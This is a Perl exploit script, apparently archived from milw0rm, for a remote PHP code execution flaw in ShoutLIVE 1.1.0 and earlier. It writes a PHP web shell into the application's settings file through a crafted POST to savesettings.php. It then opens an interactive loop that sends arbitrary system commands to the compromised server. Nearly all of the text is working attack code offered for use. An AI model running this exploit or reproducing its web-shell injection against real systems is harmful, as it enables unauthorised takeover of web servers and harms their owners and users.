#!/usr/bin/perl
##################################################
# ShoutLIVE <= 1.1.0 Remote Php Code Execution
# Based on: http://www.frsirt.com/bulletins/4109
# Credits: Coded by DarkFig
# Website: http://disarm.free.fr/bo_hard/
# Greetz: All AcidRoot/Bod members =)
##################################################
use IO::Socket;
use LWP::Simple;

if(!$ARGV[1]){headers();
print "\n| Usage: perl shoutlive110.pl <host> <path>   |
+---------------------------------------------+
| Coded by DarkFig |
+------------------+
";exit}

sub headers() {
print "\n
+----------------------------------------------+
| ShoutLIVE <= 1.1.0 Remote Php Code Execution |
+----------------------------------------------+";}

$host = $ARGV[0];
$path = $ARGV[1];
headers();
$ncon = "\n [-]Can't connect to $host...";
$ycon = "\n [+]Connected to $host...";
$sdat = "\n [~]Sending malicious request...";
$ycmd = "\n [+]System command writed...";
$req1 = "send_email=0\" ?> <? \$cmd = \$_GET\['cmd']; system(\$cmd); ?> <? #";
$lgr1 = length $req1;
$psti = "$path"."savesettings.php";

my $sock = new IO::Socket::INET(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or die "$ncon";
print "$ycon"."$sdat";
print $sock "POST $psti HTTP/1.1
Host: $host
Content-Type: application/x-www-form-urlencoded
Content-Length: $lgr1

$req1\n";
close($sock);
print "$ycmd";

while(1 ne 2){
print "\n [$host]\$ ";chomp($cmd = <STDIN>);
if($cmd eq "exit"){eofi();}
$req2 = "http://"."$host"."$path"."settings.php"."?cmd="."$cmd";
$page = get($req2) or die "$ncon";
print $page;}

sub eofi() {
print "+----------------------------------------------+
|     Coded by DarkFig : [*BoD*]_AcidRoot      |
+----------------------------------------------+\n";exit;}

# milw0rm.com [2006-03-18]
